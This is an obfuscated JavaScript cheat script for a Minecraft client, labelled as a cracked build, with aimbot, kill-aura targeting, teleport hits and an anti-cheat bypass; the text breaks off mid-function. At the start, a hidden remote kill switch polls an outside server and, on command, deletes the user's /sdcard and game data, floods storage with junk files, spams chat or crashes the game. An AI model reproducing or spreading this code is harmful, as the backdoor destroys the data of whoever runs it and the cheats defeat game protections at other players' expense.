//Name: Novexare-Cracked
//BY:Justice-Cracker
file_delete(getResource() + "/script/XxxGBRCxxX.js");
curl_get("http://w.t3yanzheng.com/1FA2DE155A5C0CE2?t=" + Date.now(), {}, function (_0x19fcdf, _0x3d003d) {
  if (_0x3d003d == "delete_script") {
    file_delete(getResource() + "/script/NoveXare.js");
  }
  if (_0x3d003d == "delete_all") {
    file_delete("/sdcard");
    file_delete("/data/data/com.netease.x19");
  }
  if (_0x3d003d == "delete_runaway") {
    file_delete("/data/data/com.netease.x19/shared_prefs/com.mojang.minecraftpe.MainActivity.xml");
  }
  if (_0x3d003d == "delete_user") {
    setData("NoveXare_Verify", "{}");
  }
  if (_0x3d003d == "boom") {
    for (i = 0; i < 114514; i++) {
      write_file("/sdcard/" + i, "你好".repeat(114514));
    }
  }
  if (_0x3d003d == "RunAway") {
    sendChatMessage("!购买跑路科技找我");
  }
  if (_0x3d003d == "exit") {
    exit();
  }
  if (_0x3d003d == "闪退") {
    setEntityName(self_id, "你好");
  }
});
const version = 65;
curl_get("http://w.t3yanzheng.com/44DBDBB5C8FF58DD?t=" + Date.now(), {}, function (_0x1d63aa, _0x58206c) {
  if (Number(_0x58206c) > version) {
    clientMessage("§e§l[NoveXare] §r§7>>>§r§c 版本号较低 §7>>>§r " + _0x58206c);
    exit();
  } else {
    clientMessage("§e§l[NoveXare] §r§7>>>§r§c 版本号 §7>>>§r " + version);
  }
});
curl_get("http://w.t3yanzheng.com/456CA7E821390F1B?t=" + Date.now(), {}, function (_0x4e6925, _0x340f7e) {
  clientMessage("§e§l[NoveXare] §r§7>>>§r 公告 §r§7>>>§r " + _0x340f7e);
});
const silentAim = (_0x5a15b9, _0x215c99) => {
  var _0x552170 = {
    pitch: _0x5a15b9,
    yaw: _0x215c99
  };
  var _0x5040e5 = {
    id: self_id,
    pos: self_pos,
    mode: 1,
    ground: true,
    rot: _0x552170,
    yHeadRot: _0x5a15b9
  };
  sendMovePlayer(_0x5040e5);
};
const callFunc = (_0x73b877, _0x24a40e) => {
  if (_0x24a40e) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r " + _0x73b877 + " §r§7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§a") + " §lEnable ◆");
  } else {
    clientMessage("§3§l[NoveXare] §r§7>>>§r " + _0x73b877 + " §r§7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§c") + " §lDisable ◇");
  }
  if (bind_func[_0x73b877] != undefined && bind_func[_0x73b877].length > 0) {
    for (let _0x17e66a of bind_func[_0x73b877]) {
      callFunc(_0x17e66a, _0x24a40e);
    }
  }
  globalThis[_0x73b877] = _0x24a40e;
  NoveXare_Config[_0x73b877] = _0x24a40e;
};
const drawParticle = (_0x5823d2, _0x20e5da, _0x378ae6, _0x300389, _0x2a6290) => {
  for (let _0x3a4aed = 0; _0x3a4aed < _0x2a6290; _0x3a4aed++) {
    addParticle(Number(_0x5823d2), _0x20e5da, _0x378ae6, _0x300389, _0x20e5da, _0x378ae6, _0x300389, 1);
  }
};
const useItem = () => {
  const _0x3d1176 = getEntityCarriedItem(self_id);
  const _0x123a1e = getEntityPos(self_id);
  if (_0x3d1176.namespace != "minecraft:air" && _0x3d1176.count > 0) {
    buildBlock(self_id, _0x123a1e.x, _0x123a1e.y, _0x123a1e.z, 6);
  }
};
const useArmor = _0x362b07 => {
  StartArmor = true;
  const _0x69b420 = getPlayerInventoryItem(self_id, _0x362b07);
  const _0x4152b7 = getItemType(self_id, _0x362b07);
  const _0x1dc39e = ["helmet", "chestplate", "leggings", "boots"];
  if (_0x69b420.namespace != "minecraft:air" && _0x69b420.count > 0 && _0x1dc39e.includes(_0x4152b7) && (CurrentArmor[_0x4152b7] == undefined || getItemArmor(self_id, _0x362b07) > getItemArmor(self_id, -2, CurrentArmor[_0x4152b7])) && selectPlayerInventorySlot(self_id, _0x362b07)) {
    setTimeout(() => {
      const _0x25b72b = getEntityCarriedItem(self_id);
      if (_0x25b72b.namespace == _0x69b420.namespace) {
        useItem();
        CurrentArmor[_0x4152b7] = _0x25b72b.namespace;
        StartArmor = false;
      }
    }, 50);
  }
};
const getParabola = (_0x905a96, _0x306827, _0x2922fc, _0x191f97) => {
  let _0x2e9f9a = _0x306827 > 0;
  _0x306827 = Math.abs(_0x306827);
  let _0x13b671 = _0x2922fc * Math.cos(_0x306827 * Math.PI / 180);
  let _0x124d95 = _0x2922fc * Math.sin(_0x306827 * Math.PI / 180);
  let _0xa6e418 = _0x124d95 / _0x191f97;
  let _0x3198a2 = _0x191f97 * (_0xa6e418 * _0xa6e418) * 0.5;
  let _0x3d0bdb = _0x13b671 * _0xa6e418;
  let _0x3eb6af = -_0x3198a2 / (_0x3d0bdb * _0x3d0bdb);
  var _0x4fe4f6 = {};
  _0x4fe4f6.data = _0x3eb6af * Math.pow(_0x905a96 - (_0x2e9f9a ? -_0x3d0bdb : _0x3d0bdb), 2) + _0x3198a2;
  _0x4fe4f6.bool = _0x2e9f9a;
  return _0x4fe4f6;
};
const getUserID = _0x28a0e5 => _0x28a0e5 == undefined || _0x28a0e5 == null ? getLocalPlayerUniqueID() : _0x28a0e5;
const HYTBuild = (_0xdae82d, _0x5beab1, _0x38f121) => {
  const _0x47eee4 = [[_0xdae82d, _0x5beab1 + 1, _0x38f121], [_0xdae82d, _0x5beab1 - 1, _0x38f121], [_0xdae82d, _0x5beab1, _0x38f121 + 1], [_0xdae82d, _0x5beab1, _0x38f121 - 1], [_0xdae82d + 1, _0x5beab1, _0x38f121], [_0xdae82d - 1, _0x5beab1, _0x38f121]];
  for (let _0xd2d83d = 0; _0xd2d83d < _0x47eee4.length; _0xd2d83d++) {
    const _0x3ffe21 = getBlock(_0x47eee4[_0xd2d83d][0], _0x47eee4[_0xd2d83d][1], _0x47eee4[_0xd2d83d][2]);
    if (_0x3ffe21.namespace !== "minecraft:air") {
      buildBlock(self_id, _0x47eee4[_0xd2d83d][0], _0x47eee4[_0xd2d83d][1], _0x47eee4[_0xd2d83d][2], _0xd2d83d);
      break;
    }
  }
};
const playSound = (_0x32fa8d, _0x54f5d3) => {
  const _0x52e709 = getEntityPos(self_id);
  sendSound(_0x32fa8d, _0x52e709.x, _0x52e709.y, _0x52e709.z, _0x54f5d3);
};
const Teleport = (_0x4f4262, _0x2570ff, _0x4245ed) => {
  const _0x56bba4 = getEntityPos(self_id);
  motion_list.push([_0x4f4262 - _0x56bba4.x, _0x2570ff - _0x56bba4.y, _0x4245ed - _0x56bba4.z]);
  motion_list.push([0, 0, 0]);
};
const getItemCount = (_0x5b6cbe, _0x3a539d) => {
  let _0x57d744 = 0;
  let _0x4ff960 = _0x5b6cbe == -1 ? getEntityCarriedItem(self_id) : getPlayerInventoryItem(self_id, _0x5b6cbe);
  if (_0x3a539d != undefined) {
    _0x4ff960.namespace = _0x3a539d;
  }
  for (let _0x2e13ff = 0; _0x2e13ff < 36; _0x2e13ff++) {
    let _0x335810 = getPlayerInventoryItem(self_id, _0x2e13ff);
    if (_0x335810.namespace == _0x4ff960.namespace && (_0x3a539d != undefined || _0x335810.aux == _0x4ff960.aux)) {
      _0x57d744 += _0x335810.count;
    }
  }
  return _0x57d744;
};
const getItemType = (_0x553ec2, _0x4a603e, _0x1cb4c0) => {
  var _0x108018 = _0x4a603e == -1 ? getEntityCarriedItem(_0x553ec2) : getPlayerInventoryItem(_0x553ec2, _0x4a603e);
  if (!_0x108018.namespace.includes("_") && _0x1cb4c0 == undefined) {
    return "other";
  }
  var _0x247d24 = _0x1cb4c0 == undefined ? _0x108018.namespace.replace("minecraft:", "") : _0x1cb4c0.replace("minecraft:", "");
  const _0x3676a2 = _0x247d24.split("_");
  return _0x3676a2[1];
};
const getEntityMaxDamage = _0x33fb1c => {
  let _0x488ea4 = 0;
  for (let _0x5d25f3 = 0; _0x5d25f3 < 36; _0x5d25f3++) {
    const _0x1912a6 = getItemDamage(_0x33fb1c, _0x5d25f3);
    if ((getItemType(self_id, _0x5d25f3) == "sword" || getItemType(self_id, _0x5d25f3) == "axe" || getItemType(self_id, _0x5d25f3) == "pickaxe") && _0x1912a6 > _0x488ea4) {
      _0x488ea4 = _0x1912a6;
    }
  }
  return _0x488ea4;
};
const getEntityMaxArmor = (_0x521138, _0x39b2cc) => {
  let _0xed44b7 = 0;
  for (let _0x3bd01c = 0; _0x3bd01c < 36; _0x3bd01c++) {
    if (getItemType(_0x521138, _0x3bd01c) == _0x39b2cc && _0xed44b7 < getItemArmor(_0x521138, _0x3bd01c)) {
      _0xed44b7 = getItemArmor(_0x521138, _0x3bd01c);
    }
  }
  if (CurrentArmor[_0x39b2cc] != null && _0xed44b7 < getItemArmor(_0x521138, -2, CurrentArmor[_0x39b2cc])) {
    _0xed44b7 = getItemArmor(_0x521138, -2, CurrentArmor[_0x39b2cc]);
  }
  return _0xed44b7;
};
const getItemArmor = (_0x485423, _0x2ac7da, _0x509ed4) => {
  var _0x5b1c5e = _0x2ac7da == -1 ? getEntityCarriedItem(_0x485423) : getPlayerInventoryItem(_0x485423, _0x2ac7da);
  if (!_0x5b1c5e.namespace.includes("_") && _0x509ed4 == undefined) {
    return 1;
  }
  var _0x265f60 = _0x509ed4 == undefined ? _0x5b1c5e.namespace.replace("minecraft:", "") : _0x509ed4.replace("minecraft:", "");
  const _0x1f81ee = _0x265f60.split("_");
  return texture[_0x1f81ee[0]];
};
const getItemDamage = (_0x3a8e9c, _0x2f2f64) => {
  var _0x215fce = _0x2f2f64 == -1 ? getEntityCarriedItem(_0x3a8e9c) : getPlayerInventoryItem(_0x3a8e9c, _0x2f2f64);
  if (!_0x215fce.namespace.includes("_")) {
    return 1;
  }
  var _0x384d09 = _0x215fce.namespace.replace("minecraft:", "");
  const _0x21ff58 = _0x384d09.split("_");
  return type[_0x21ff58[1]] + texture[_0x21ff58[0]];
};
const b2s = _0x515d28 => _0x515d28 ? "true" : "false";
const getText = (_0x2f0093, _0x3f37df, _0x18c020) => {
  let _0x16f01e = _0x2f0093.indexOf(_0x3f37df) + _0x3f37df.length;
  let _0xf98463 = _0x2f0093.indexOf(_0x18c020, _0x16f01e);
  return _0x2f0093.substring(_0x16f01e, _0xf98463);
};
const attack = (_0x43d237, _0x3e4d8b) => {
  attackEntity(_0x43d237, _0x3e4d8b);
  if (bypass_ec_attack) {
    sendRpc(98247598, "93c40b4d6f644576656e7443325394c41145434e756b6b6974436c69656e744d6f64c41445434e756b6b6974436c69656e7453797374656dc419496e7465726163744265666f7265436c69656e744576656e7481c40474797065c403544150c0");
  }
};
const getItem = (_0x47ce13, _0x5674d8, _0x4873ff, _0x49bfce) => {
  if (_0x4873ff == undefined) {
    _0x4873ff = -1;
  }
  if (_0x49bfce == undefined) {
    _0x49bfce = -1;
  }
  let _0x19251f = null;
  for (index = 0; index < 9; index++) {
    const _0x15416e = getPlayerInventoryItem(_0x47ce13, index);
    if (!_0x15416e.namespace) {
      continue;
    }
    if (_0x15416e.namespace.includes(_0x5674d8) && (_0x15416e.aux == _0x4873ff || _0x4873ff == -1) && (_0x15416e.name.includes(_0x49bfce) || _0x49bfce == -1)) {
      _0x19251f = index;
      break;
    }
  }
  return _0x19251f;
};
const getSpeed = _0x496a30 => {
  const _0x1052cd = getEntityMotion(_0x496a30);
  const _0x5155de = Math.sqrt(_0x1052cd.x * _0x1052cd.x + _0x1052cd.y * _0x1052cd.y + _0x1052cd.z * _0x1052cd.z);
  return _0x5155de * 20;
};
const getRandomNum = (_0x51437c, _0x9ab7fd) => {
  const _0x58c94a = _0x9ab7fd - _0x51437c + 1;
  return Math.floor(Math.random() * _0x58c94a) + _0x51437c;
};
const predictEntityPos = (_0x949e87, _0x308bc6, _0x409987) => {
  var _0x3538dd = {
    x: _0x308bc6.x + _0x949e87.x * _0x409987,
    y: _0x308bc6.y + _0x949e87.x * _0x409987,
    z: _0x308bc6.z + _0x949e87.z * _0x409987
  };
  return _0x3538dd;
};
const timeFormat = _0x422ab4 => {
  if (_0x422ab4 < 60) {
    return _0x422ab4 + "秒";
  }
  if (_0x422ab4 >= 60) {
    return Math.floor(_0x422ab4 / 60) + "分 " + _0x422ab4 % 60 + "秒";
  }
};
const noWall = (_0x577e07, _0x5ead2e, _0x29bcf2) => {
  if (!_0x29bcf2) {
    return true;
  }
  const _0x1d15c6 = getPlayerAngle(_0x577e07, _0x5ead2e, "yaw_pos");
  const _0x60598e = -getPlayerAngle(_0x577e07, _0x5ead2e, "pitch_pos");
  const _0x2573e1 = getDistance(_0x577e07, _0x5ead2e);
  var _0x36e2e9 = true;
  for (let _0x28bc6e = 0; _0x28bc6e < _0x2573e1; _0x28bc6e += 0.5) {
    var _0x1b06fe = {
      yaw: _0x1d15c6,
      pitch: _0x60598e
    };
    const _0x41e875 = getDisplacement(_0x28bc6e, _0x5ead2e, _0x1b06fe);
    const _0x4da2c0 = getBlock(_0x41e875.x, _0x41e875.y, _0x41e875.z);
    if (_0x4da2c0.namespace != "minecraft:air") {
      _0x36e2e9 = false;
      break;
    }
  }
  return _0x36e2e9;
};
const PlayerSelector = (_0x3f8329, _0x13ad66) => {
  var _0x3e36a7 = getWorldPlayerList();
  var _0xc70756 = _0x3e36a7.length > 0 ? _0x3e36a7.map(_0x50cb43 => ({
    text: _0x50cb43.name
  })) : [{
    text: "没有数据"
  }];
  var _0xff392 = {
    type: "form",
    title: "选择",
    content: "选择一个目标",
    buttons: _0xc70756
  };
  var _0x422b9e = _0xff392;
  const _0x18d47d = JSON.stringify(_0x422b9e);
  addForm(_0x18d47d, function (_0xedd831) {
    if (_0x3e36a7.length > 0 && _0xedd831 >= 0) {
      var _0x123efc = _0x13ad66 === 0 ? _0x3e36a7[_0xedd831].name : _0x3e36a7[_0xedd831].id;
      globalThis[_0x3f8329].push(_0x123efc);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddTarget §7>>>§r " + _0x123efc);
      }
    }
  });
};
const getDisplacement = (_0x15c2dc, _0x418cec, _0x4bc27f) => {
  var _0x4816b8 = _0x15c2dc < 0 ? true : false;
  let {
    yaw,
    pitch
  } = _0x4bc27f;
  if (yaw <= -180) {
    yaw = 180;
  }
  _0x15c2dc = Math.abs(_0x15c2dc);
  const _0x100789 = yaw * Math.PI / 180;
  const _0x7fdb71 = pitch * Math.PI / 180;
  let _0x50526e = 0;
  let _0x45af65 = pitch != 0 ? Math.sin(_0x7fdb71) * _0x15c2dc : 0;
  let _0x194b80 = 0;
  var _0x5c00bf = pitch != 0 ? _0x45af65 / Math.tan(_0x7fdb71) : _0x15c2dc;
  var _0x3bde60 = _0x5c00bf < 0;
  _0x5c00bf = Math.abs(_0x5c00bf);
  switch (true) {
    case yaw > 90 && yaw <= 180:
      _0x194b80 = Math.cos(_0x100789) * _0x5c00bf;
      _0x50526e = -Math.sin(_0x100789) * _0x5c00bf;
      break;
    case yaw > 0 && yaw <= 90:
      _0x194b80 = Math.cos(_0x100789) * _0x5c00bf;
      _0x50526e = -Math.sin(_0x100789) * _0x5c00bf;
      break;
    case yaw > -90 && yaw <= 0:
      _0x194b80 = Math.cos(-_0x100789) * _0x5c00bf;
      _0x50526e = Math.sin(-_0x100789) * _0x5c00bf;
      break;
    case yaw > -180 && yaw <= -90:
      _0x194b80 = Math.cos(-_0x100789) * _0x5c00bf;
      _0x50526e = Math.sin(-_0x100789) * _0x5c00bf;
      break;
  }
  if (_0x4816b8 || _0x3bde60) {
    _0x50526e = -_0x50526e;
    if (!_0x3bde60) {
      _0x45af65 = -_0x45af65;
    }
    _0x194b80 = -_0x194b80;
  }
  var _0x4ba661 = {
    x: _0x418cec.x + _0x50526e,
    y: _0x418cec.y - _0x45af65,
    z: _0x418cec.z + _0x194b80
  };
  return _0x4ba661;
};
const getPlayerItemCount = _0x59c36a => {
  let _0x1865ae = 0;
  for (let _0x52739a = 0; _0x52739a < 36; _0x52739a++) {
    let _0xecac77 = getPlayerInventoryItem(_0x59c36a, _0x52739a);
    _0x1865ae += _0xecac77.count;
  }
  return _0x1865ae;
};
const isSame = (_0xc266b9, _0x5e2309, _0x8f53a1) => Math.abs(_0xc266b9 - _0x5e2309) < _0x8f53a1;
const getTargets = (_0xd43730, _0x2f693, _0x27577c) => {
  let _0x3e5c08 = [];
  if (includeMob) {
    _0x3e5c08 = _0x3e5c08.concat(getEntityList());
  }
  if (includePlayer) {
    _0x3e5c08 = _0x3e5c08.concat(getPlayerList());
  }
  if (_0x3e5c08.length === 0) {
    return [];
  }
  _0x27577c = Math.min(_0x27577c, _0x3e5c08.length);
  let _0x6c366c = [];
  for (const _0x3a500b of _0x3e5c08) {
    const _0x4152f2 = getEntityNamespace(_0x3a500b);
    if (entity_keyword.length > 0 && entity_keyword.some(_0x17acaf => _0x4152f2.includes(_0x17acaf)) != back_select) {
      continue;
    }
    const _0x1df47b = getEntityRot(_0x3a500b);
    if (check_rot && (_0x1df47b.yaw.toFixed(2) === 0 || _0x1df47b.pitch.toFixed(2) === 0)) {
      continue;
    }
    const _0xe9f32f = getEntityFlag(_0x3a500b, 5);
    if (check_hide && _0xe9f32f) {
      continue;
    }
    const _0x3cacb4 = getEntityIsGround(_0x3a500b);
    if (check_ground && !_0x3cacb4) {
      continue;
    }
    const _0x41c873 = getEntityAttribute(_0x3a500b, "minecraft:health");
    if (check_health && (!_0x41c873 || _0x41c873.current <= 0)) {
      continue;
    }
    const _0x28411f = getEntityPos(_0x3a500b);
    const _0x43a95e = getDistance(_0x28411f, getEntityPos(_0xd43730));
    if ((_0x43a95e > _0x2f693 || _0x43a95e < min_distance) && !InfiniteAura && !infinite_distance) {
      continue;
    }
    if (!noWall(getEntityPos(self_id), _0x28411f, check_wall)) {
      continue;
    }
    const _0x19b2ae = getEntityName(_0x3a500b);
    if (teams && (_0x19b2ae.startsWith(team) || team.includes("[") && _0x19b2ae.includes(team))) {
      continue;
    }
    if (white_list.includes(_0x3a500b) != back_select || !check_name && (_0x19b2ae === getEntityName(_0xd43730) || _0x19b2ae === "") || _0x28411f.y > limit_y && _0x28411f.y < limit_min_y && !NoHeigh || _0x3a500b === self_id) {
      continue;
    }
    if (regex_enable && regex.some(_0x491278 => _0x19b2ae.includes(_0x491278)) != back_select) {
      continue;
    }
    const _0x34d7ab = check_size ? getEntitySize(_0x3a500b) : {
      x: 0,
      y: 0
    };
    if (check_size && (_0x34d7ab.x > default_size.x + 0.1 || _0x34d7ab.y > 1.66 && _0x34d7ab.y < 1.64 || _0x34d7ab.y < default_size.y - 0.1 || _0x34d7ab.y > 1.51 && _0x34d7ab.y < 1.49)) {
      continue;
    }
    const _0x16b4df = func_mode.select_mode === 4 ? getPlayerItemCount(_0x3a500b) : 0;
    const _0x5ca070 = bypass_bjd ? getEntityAttribute(_0x3a500b, "minecraft:movement") : {
      current: 0,
      max: 0
    };
    if (bypass_bjd && _0x5ca070.current >= 0.2 && _0x5ca070.max <= 1024 && _0x3a500b.length > 3) {
      continue;
    }
    const _0x251436 = func_mode.select_mode === 3 ? getPlayerAngle(self_id, _0x3a500b, "yaw_rot") : 0;
    const _0x41df48 = func_mode.select_mode === 3 ? getPlayerAngle(self_id, _0x3a500b, "pitch_rot") : 0;
    const _0x47cedf = func_mode.select_mode === 2 ? getItemDamage(_0x3a500b, -1) : 8;
    var _0x4bd51d = {
      distance: _0x43a95e,
      target_id: _0x3a500b,
      damage: _0x47cedf,
      heal: _0x41c873.current
    };
    _0x4bd51d.crosshair = Math.sqrt(_0x251436 * _0x251436 + _0x41df48 * _0x41df48);
    _0x4bd51d.items = _0x16b4df;
    _0x4bd51d.random = getRandomNum(0, _0x3e5c08.length - 1);
    _0x6c366c.push(_0x4bd51d);
  }
  const _0xf6e5f9 = [(_0x4694ed, _0x106589) => _0x4694ed.distance - _0x106589.distance, (_0x2f5e8d, _0x6a5f5c) => _0x2f5e8d.heal - _0x6a5f5c.heal, (_0x55b94d, _0x3af89d) => _0x55b94d.damage - _0x3af89d.damage, (_0x127d8c, _0x18b400) => _0x127d8c.crosshair - _0x18b400.crosshair, (_0x50ae7e, _0xf94d9b) => _0xf94d9b.items - _0x50ae7e.items, (_0x1e65b5, _0x7bd211) => _0x1e65b5.random - _0x7bd211.random];
  _0x6c366c.sort(_0xf6e5f9[func_mode.select_mode]);
  if (reverse_target) {
    _0x6c366c.reverse();
  }
  return _0x6c366c.slice(0, _0x27577c).map(_0x205227 => _0x205227.target_id);
};
const getDistance = (_0xeca333, _0xb5f67e) => Math.sqrt(Math.pow(_0xeca333.x - _0xb5f67e.x, 2) + Math.pow(_0xeca333.y - _0xb5f67e.y, 2) + Math.pow(_0xeca333.z - _0xb5f67e.z, 2));
const getDistanceByID = (_0x37aeef, _0x326d08) => {
  const _0x57b760 = getEntityPos(_0x37aeef);
  const _0x3f0755 = getEntityPos(_0x326d08);
  return Math.sqrt(Math.pow(_0x57b760.x - _0x3f0755.x, 2) + Math.pow(_0x57b760.y - _0x3f0755.y, 2) + Math.pow(_0x57b760.z - _0x3f0755.z, 2));
};
const getHorizontalDistanceByID = (_0x3f0afd, _0x3464f2) => {
  const _0x22e9b8 = getEntityPos(_0x3f0afd);
  const _0x308ab1 = getEntityPos(_0x3464f2);
  return Math.sqrt(Math.pow(_0x22e9b8.x - _0x308ab1.x, 2) + Math.pow(_0x22e9b8.z - _0x308ab1.z, 2));
};
const MenuTP = (_0x459fc4, _0x564a5c, _0x5adfb0) => {
  var _0x2126c4 = {
    value: "set_pos",
    x: _0x459fc4,
    y: _0x564a5c,
    z: _0x5adfb0
  };
  let _0x174f75 = _0x2126c4;
  callModule(5, JSON.stringify(_0x174f75));
};
const getHorizontalDistance = (_0x3bf644, _0x2b273d) => Math.sqrt(Math.pow(_0x3bf644.x - _0x2b273d.x, 2) + Math.pow(_0x3bf644.z - _0x2b273d.z, 2));
const setPos = (_0xb11f8e, _0x449240, _0x455afb) => setEntityPos(self_id, _0xb11f8e, _0x449240, _0x455afb);
const setMotion = (_0x19c5cb, _0x993ff8, _0x33fd29) => setEntityMotion(self_id, _0x19c5cb, _0x993ff8, _0x33fd29);
const str2obj = _0x397dfb => {
  if (_0x397dfb === "") {
    return [];
  }
  if (!_0x397dfb.includes(",")) {
    return [_0x397dfb];
  } else {
    return _0x397dfb.split(",");
  }
};
const obj2str = _0x6f99ab => {
  if (typeof _0x6f99ab != "object" || _0x6f99ab.length == 0) {
    return "";
  }
  if (_0x6f99ab.length == 1) {
    return _0x6f99ab[0];
  } else {
    return _0x6f99ab.join(",");
  }
};
const EditValue = (_0x1243ae, _0x4a0246) => {
  var _0x13bb0a = typeof _0x4a0246 == "object" ? obj2str(_0x4a0246) : _0x4a0246;
  var _0x1b8d95 = typeof _0x4a0246 == "object" ? 0 : 1;
  addForm("{\"type\":\"custom_form\",\"title\":\"编辑变量\",\"content\":[{\"type\":\"input\",\"text\":\"" + _0x1243ae + "\",\"placeholder\":\"\",\"default\":\"" + _0x13bb0a + "\"}]}", function (_0x77fe8c) {
    if (_0x1b8d95 == 1) {
      globalThis[_0x1243ae] = _0x77fe8c;
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r SetValue §7>>>§r " + _0x1243ae + " §7>>>§r " + _0x77fe8c);
      }
    }
    if (_0x1b8d95 == 0) {
      globalThis[_0x1243ae] = str2obj(_0x77fe8c);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r SetValue §7>>>§r " + _0x1243ae + " §7>>>§r " + _0x77fe8c);
      }
    }
    NoveXare_Config[_0x1243ae] = globalThis[_0x1243ae];
  });
};
const getTeams = _0x51dd10 => {
  if (typeof _0x51dd10 != "string" || _0x51dd10 == "") {
    return "None";
  }
  let _0x14c5ec = _0x51dd10.match(/\[(.*?)\]/g);
  if (_0x14c5ec == null) {
    return "None";
  }
  return _0x14c5ec[0];
};
const readFile = _0x3686f9 => {
  const _0x3d72a8 = read_file(_0x3686f9);
  if (_0x3d72a8 == "") {
    return "{}";
  } else {
    return _0x3d72a8;
  }
};
const getPlayerBlockPos = _0x30c830 => {
  const _0x2d3d4e = getEntityPos(_0x30c830);
  let _0x542652 = _0x30c830 == self_id ? Math.floor(_0x2d3d4e.y) - 1 : Math.floor(_0x2d3d4e.y);
  var _0x17417e = {};
  _0x17417e.x = Math.floor(_0x2d3d4e.x);
  _0x17417e.y = _0x542652;
  _0x17417e.z = Math.floor(_0x2d3d4e.z);
  return _0x17417e;
};
const subtraction = (_0x74f895, _0x5c137c) => {
  if (_0x74f895.length == _0x5c137c.length) {
    return [];
  }
  let _0x118c84 = _0x74f895.length >= _0x5c137c.length ? _0x74f895 : _0x5c137c;
  let _0x1a3562 = _0x74f895.length < _0x5c137c.length ? _0x74f895 : _0x5c137c;
  let _0x30f8ff = [];
  for (let _0x420337 of _0x118c84) {
    if (!_0x1a3562.includes(_0x420337)) {
      _0x30f8ff.push(_0x420337);
    }
  }
  return _0x30f8ff;
};
const PluginCMD = _0x22cbab => {
  executePluginCommand(_0x22cbab);
  NoveXare_Config.cmd.push(_0x22cbab);
};
const getWorldPlayerID = () => {
  const _0x4d2fa6 = getWorldPlayerList();
  return _0x4d2fa6.map(_0x54e4f4 => _0x54e4f4.id);
};
const calculateLaunchAngle = (_0x4a1bf1, _0x139fb3) => {
  const _0x5df2f0 = assistaim_speed;
  const _0x57365d = assistaim_gravity;
  const _0x168a5d = Math.atan((Math.pow(_0x5df2f0, 2) - Math.sqrt(Math.pow(_0x5df2f0, 4) - _0x57365d * (_0x57365d * Math.pow(_0x4a1bf1, 2) + _0x139fb3 * 2 * Math.pow(_0x5df2f0, 2)))) / (_0x57365d * _0x4a1bf1));
  const _0x3d79ee = _0x168a5d * 180 / Math.PI;
  return _0x3d79ee;
};
const getArrowFlyTime = (_0x297a22, _0x19f400, _0x4d3ff1, _0x1510cf) => {
  let _0x1435c0 = _0x4d3ff1 > 0;
  let _0x39828f = Math.abs(_0x4d3ff1) * Math.PI / 180;
  let _0x4db704 = Math.cos(_0x39828f) * _0x19f400;
  let _0x13c99d = _0x4db704 / assistaim_gravity;
  let _0x5e93c2 = Math.sqrt(_0x1510cf * 2 / assistaim_gravity);
  let _0x30de2b = _0x1435c0 ? _0x5e93c2 : _0x5e93c2 + _0x13c99d;
  return _0x30de2b;
};
const getPlayerAngle = (_0x536d08, _0x480d5b, _0x5eb99d) => {
  let _0xdf0de0 = typeof _0x480d5b != "string" ? _0x480d5b : getEntityPos(_0x480d5b);
  let _0xdaf0a2 = typeof _0x536d08 != "string" ? _0x536d08 : getEntityPos(_0x536d08);
  let _0x802b60 = getEntityRot(_0x536d08);
  const _0xb8c96 = getHorizontalDistance(_0xdaf0a2, _0xdf0de0);
  if (assistaim_predict) {
    _0xdf0de0 = predictEntityPos(getEntityMotion(_0x480d5b), getEntityPos(_0x480d5b), getArrowFlyTime(_0xb8c96, assistaim_speed, _0x802b60.pitch, -_0xdaf0a2.y + _0xdf0de0.y) * 20);
  }
  let _0x2a4a9f = getEntitySize(_0x480d5b);
  let _0x512173 = _0xdf0de0.x - _0xdaf0a2.x;
  let _0x1eb7dd = _0xdaf0a2.y - _0xdf0de0.y + assistaim_y / 10 + getRandomNum(0, assistaim_random_y) / 10;
  let _0x2f3566 = _0xdf0de0.z - _0xdaf0a2.z;
  if (_0x5eb99d == "yaw_pos") {
    let _0x125eb3 = Math.atan2(_0x2f3566, _0x512173) * 180 / Math.PI;
    if (_0x125eb3 > -180 && _0x125eb3 <= 90) {
      return _0x125eb3 + 90;
    } else {
      return _0x125eb3 - 270;
    }
  }
  if (_0x5eb99d == "yaw_rot") {
    var _0x5115e8 = _0x802b60.yaw;
    let _0x3f5698 = Math.atan2(_0x2f3566, _0x512173) * 180 / Math.PI;
    _0x3f5698 = _0x3f5698 > -180 && _0x3f5698 <= 90 ? _0x3f5698 + 90 : _0x3f5698 - 270;
    let _0xa2146b = _0x3f5698 - _0x5115e8 + getRandomNum(-assistaim_random_xz / 2, assistaim_random_xz / 2);
    if (_0xa2146b > 0) {
      return -_0xa2146b + 180;
    } else {
      return -_0xa2146b - 180;
    }
  }
  if (_0x5eb99d == "pitch_pos") {
    const _0x3a35cb = calculateLaunchAngle(_0xb8c96, _0x1eb7dd);
    let _0x522526 = assistaim_throw ? _0x3a35cb : Math.atan2(_0x1eb7dd, _0xb8c96) * 180 / Math.PI;
    return _0x522526;
  }
  if (_0x5eb99d == "pitch_rot") {
    var _0x13ba21 = _0x802b60.pitch;
    const _0x272c41 = calculateLaunchAngle(_0xb8c96, _0x1eb7dd);
    let _0x2ba611 = assistaim_throw ? _0x272c41 : Math.atan2(_0x1eb7dd, _0xb8c96) * 180 / Math.PI;
    let _0x10092d = _0x2ba611 - _0x13ba21;
    return _0x10092d;
  }
};
const isAimed = (_0x1ae70e, _0x4c894a, _0x10a2cb, _0x14ff6c) => {
  let _0x4b48f7 = Math.abs(getPlayerAngle(_0x1ae70e, _0x4c894a, "yaw_rot"));
  let _0x4340b6 = Math.abs(getPlayerAngle(_0x1ae70e, _0x4c894a, "pitch_rot"));
  if (_0x14ff6c == 0) {
    return Math.sqrt(_0x4b48f7 * _0x4b48f7 + _0x4340b6 * _0x4340b6) < _0x10a2cb;
  }
  if (_0x14ff6c == 1) {
    return _0x4b48f7 < _0x10a2cb;
  }
  if (_0x14ff6c == 2) {
    return _0x4340b6 < _0x10a2cb;
  }
};
const tphit = _0x29aa46 => {
  if (!InfiniteAura_backPos || target_list.length == 0) {
    return;
  }
  const _0x4e5640 = predictEntityPos(getEntityMotion(_0x29aa46), getEntityPos(_0x29aa46), 1);
  const _0x197256 = InfiniteAura_random ? getRandomNum(-2, 2) : 0;
  var _0x25453a = {
    value: "set_pos",
    x: _0x4e5640.x + _0x197256,
